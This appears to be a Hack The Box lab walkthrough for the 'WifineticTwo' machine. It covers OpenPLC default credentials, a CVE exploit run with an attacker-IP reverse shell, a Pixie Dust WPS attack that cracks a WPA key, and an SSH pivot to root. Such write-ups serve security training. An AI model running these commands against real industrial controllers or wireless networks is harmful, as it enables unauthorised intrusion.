📡 HTB: WifineticTwo – Walkthrough

Difficulty: Medium
Category: IoT / Wireless / Exploitation
Tags: OpenPLC, CVE-2021-49803, Reverse Shell, WiFi Hacking, Pixie Dust, Privilege Escalation
🧠 TL;DR

    🎛️ Used default OpenPLC creds

    📟 Exploited CVE-2021-49803 to gain reverse shell

    📶 Performed Pixie Dust attack on wlan0 to breach isolated root environment

🔎 Reconnaissance

Launched standard service scan:

nmap -sC -sV -v <TARGET_IP>

Found a web service on port 8080, redirecting to /login.

Tried some directory bruteforce via feroxbuster & gobuster – no luck. The main entry point was clearly the login panel.
🔐 Default Credentials Bypass

The login page looked like it belonged to OpenPLC. Searched for default creds and quickly found:

Username: openplc
Password: openplc

✅ Logged in successfully.
⚙️ OpenPLC Exploitation – CVE-2021-49803

Searched for OpenPLC vulns and found a PoC for CVE-2021-49803 on Exploit-DB.

The default exploit targeted a program named differently from what's deployed here – mine was called blank_program. I updated the script to match the correct program name.

📡 Triggered remote code execution:

python3 exploit.py -u http://<TARGET_IP>:8080 -l openplc -p openplc -i <ATTACKER_IP> -r <PORT>

🎯 Got a reverse shell back as a pseudo-root, but not the actual system root.
🔍 Enumeration – Virtualization Barrier

Found user.txt in /root/ directory — indicating that this environment was containerized or virtualized, and not full root.

Started investigating ways to escape the jail.
📶 Wireless Recon – wlan0 Detected

Noticed an active wireless interface wlan0.

Scanned the interface:

iwlist wlan0 scan

Found network plcrouter using WPA2-PSK, CCMP, and RSN v1.0 – all pointing to Pixie Dust susceptibility.
🧨 Exploiting with Pixie Dust (OneShot)

Cloned oneshot.py by kimocoder and ran:

python3 oneshot.py -i wlan0 -b 02:00:00:00:01:00 -K

🧠 Cracked the WPA PSK of the router:

NoWWEDoKnowWhaTisReal123!

Used it to generate WPA config:

wpa_passphrase plcrouter 'NoWWEDoKnowWhaTisReal123!' > config

Established the connection:

wpa_supplicant -B -c config -i wlan0

Assigned IP manually:

ifconfig wlan0 192.168.1.5 netmask 255.255.255.0

🚪 Root Access via SSH

SSH’ed into the isolated root environment:

ssh root@192.168.1.1

✅ Logged in using the network and obtained root.txt.
🎉 Rooted!

    user.txt → Found in virtual root shell

    root.txt → Retrieved after WiFi pivot and SSH

